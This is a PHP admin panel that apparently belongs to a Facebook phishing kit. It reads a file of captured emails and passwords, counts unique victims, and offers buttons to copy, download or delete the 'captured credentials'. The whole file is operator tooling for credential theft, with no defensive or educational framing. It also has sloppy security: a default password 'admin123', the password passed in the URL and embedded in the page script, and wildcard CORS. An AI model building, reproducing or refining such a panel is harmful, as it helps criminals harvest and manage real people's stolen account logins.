<?php
// Admin panel — reads from plain text file

// CORS
header('Access-Control-Allow-Origin: *');
header('Access-Control-Allow-Methods: GET, POST');
header('Access-Control-Allow-Headers: Content-Type');

// Simple auth via environment variable or default
$admin_pass = getenv('ADMIN_PASS') ?: 'admin123';

// Check if password provided
$auth_ok = false;
if (isset($_SERVER['PHP_AUTH_PW']) && hash_equals($admin_pass, $_SERVER['PHP_AUTH_PW'])) {
    $auth_ok = true;
}
if (isset($_GET['pw']) && hash_equals($admin_pass, $_GET['pw'])) {
    $auth_ok = true;
}
// Also check POST
if (isset($_POST['password']) && hash_equals($admin_pass, $_POST['password'])) {
    $auth_ok = true;
}

if (!$auth_ok) {
    header('HTTP/1.0 401 Unauthorized');
    echo '<html><body style="font-family:sans-serif;background:#0d1117;color:#c9d1d9;display:flex;justify-content:center;align-items:center;height:100vh;">';
    echo '<form method="POST" style="background:#161b22;padding:30px;border-radius:8px;border:1px solid #30363d;">';
    echo '<h2 style="margin-bottom:20px;">Admin Login</h2>';
    echo '<input type="password" name="password" placeholder="Password" style="padding:10px;width:100%;margin-bottom:12px;background:#0d1117;border:1px solid #30363d;color:#c9d1d9;border-radius:6px;">';
    echo '<button type="submit" style="padding:10px 20px;background:#238636;color:#fff;border:none;border-radius:6px;cursor:pointer;">Login</button>';
    echo '</form></body></html>';
    exit;
}

// Read captures from text file
$txt_file = '/tmp/facebook_captures.txt';
$lines = [];
if (file_exists($txt_file)) {
    $content = file_get_contents($txt_file);
    $lines = explode("\n", trim($content));
} else {
    $lines = ['No captures yet.'];
}

// Reverse for newest first
$lines = array_reverse(array_filter($lines, function($l) { return trim($l) !== ''; }));

// Stats
$total = count($lines);
$unique_emails = [];
foreach ($lines as $l) {
    if (preg_match('/\|\s+([^\|]+)\s+\|/', $l, $m)) {
        $unique_emails[trim($m[1])] = true;
    }
}
$unique_count = count($unique_emails);

?>
<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>Admin Panel — Captures</title>
  <style>
    * { margin: 0; padding: 0; box-sizing: border-box; }
    body { font-family: -apple-system,BlinkMacSystemFont,'Segoe UI',Helvetica,Arial,sans-serif; background: #0d1117; color: #c9d1d9; padding: 20px; }
    .header { border-bottom: 1px solid #30363d; padding-bottom: 16px; margin-bottom: 20px; }
    .header h1 { font-size: 24px; color: #f0f6fc; }
    .header .stats { display: flex; gap: 20px; margin-top: 10px; flex-wrap: wrap; }
    .stat-card { background: #161b22; border: 1px solid #30363d; border-radius: 6px; padding: 12px 18px; }
    .stat-card .num { font-size: 28px; font-weight: 600; color: #58a6ff; }
    .stat-card .label { font-size: 12px; color: #8b949e; text-transform: uppercase; letter-spacing: 0.5px; }
    .tools { margin: 16px 0; display: flex; gap: 10px; flex-wrap: wrap; }
    .tools button, .tools a { background: #21262d; color: #c9d1d9; border: 1px solid #30363d; padding: 8px 16px; border-radius: 6px; cursor: pointer; text-decoration: none; font-size: 14px; }
    .tools button:hover, .tools a:hover { background: #30363d; }
    .dump-container { background: #161b22; border: 1px solid #30363d; border-radius: 6px; overflow: hidden; }
    .dump-header { background: #21262d; padding: 10px 16px; font-weight: 600; font-size: 14px; color: #8b949e; border-bottom: 1px solid #30363d; display: flex; justify-content: space-between; }
    .dump-body { padding: 16px; font-family: 'Courier New', monospace; font-size: 13px; line-height: 1.6; white-space: pre-wrap; word-break: break-all; max-height: 70vh; overflow-y: auto; }
    .dump-body .entry { padding: 4px 0; border-bottom: 1px solid #21262d; }
    .dump-body .entry:last-child { border-bottom: none; }
    .highlight { color: #f0883e; } /* email */
    .highlight-pass { color: #a5d6ff; } /* password */
    .highlight-step { color: #7ee787; }  /* step */
    .timestamp { color: #8b949e; }
    .empty { color: #8b949e; text-align: center; padding: 40px; font-style: italic; }
    ::-webkit-scrollbar { width: 8px; }
    ::-webkit-scrollbar-track { background: #0d1117; }
    ::-webkit-scrollbar-thumb { background: #30363d; border-radius: 4px; }
  </style>
</head>
<body>

<div class="header">
  <h1>🔍 Capture Admin Panel</h1>
  <div class="stats">
    <div class="stat-card">
      <div class="num"><?php echo $total; ?></div>
      <div class="label">Total Entries</div>
    </div>
    <div class="stat-card">
      <div class="num"><?php echo $unique_count; ?></div>
      <div class="label">Unique Emails</div>
    </div>
    <div class="stat-card">
      <div class="num"><?php echo file_exists($txt_file) ? number_format(filesize($txt_file)) . ' B' : '0 B'; ?></div>
      <div class="label">File Size</div>
    </div>
  </div>
</div>

<div class="tools">
  <a href="?pw=<?php echo urlencode($admin_pass); ?>" onclick="location.reload()">🔄 Refresh</a>
  <button onclick="copyAll()">📋 Copy All</button>
  <button onclick="downloadTxt()">⬇️ Download .txt</button>
  <button onclick="clearCaptures()" style="border-color:#da3633;color:#f85149;">🗑️ Clear All</button>
</div>

<div class="dump-container">
  <div class="dump-header">
    <span>captures.txt — Newest first</span>
    <span><?php echo date('Y-m-d H:i:s'); ?></span>
  </div>
  <div class="dump-body" id="dumpBody">
    <?php if (empty($lines) || (count($lines) === 1 && $lines[0] === 'No captures yet.')): ?>
      <div class="empty">No captures yet.</div>
    <?php else: ?>
      <?php foreach ($lines as $line): ?>
        <?php if (trim($line) === '') continue; ?>
        <div class="entry"><?php echo htmlspecialchars($line); ?></div>
      <?php endforeach; ?>
    <?php endif; ?>
  </div>
</div>

<script>
function copyAll() {
  var text = document.getElementById('dumpBody').innerText;
  navigator.clipboard.writeText(text).then(function() {
    alert('Copied ' + text.split('\n').length + ' lines to clipboard.');
  });
}

function downloadTxt() {
  var text = document.getElementById('dumpBody').innerText;
  var blob = new Blob([text], { type: 'text/plain' });
  var url = URL.createObjectURL(blob);
  var a = document.createElement('a');
  a.href = url;
  a.download = 'facebook_captures_<?php echo date('Y-m-d'); ?>.txt';
  a.click();
  URL.revokeObjectURL(url);
}

function clearCaptures() {
  if (!confirm('Delete ALL captured credentials?')) return;
  var xhr = new XMLHttpRequest();
  xhr.open('POST', 'clear.php');
  xhr.setRequestHeader('Content-Type', 'application/x-www-form-urlencoded');
  xhr.onload = function() {
    if (xhr.status === 200) {
      location.reload();
    } else {
      alert('Failed to clear: ' + xhr.responseText);
    }
  };
  xhr.send('password=<?php echo urlencode($admin_pass); ?>');
}
</script>
</body>
</html>
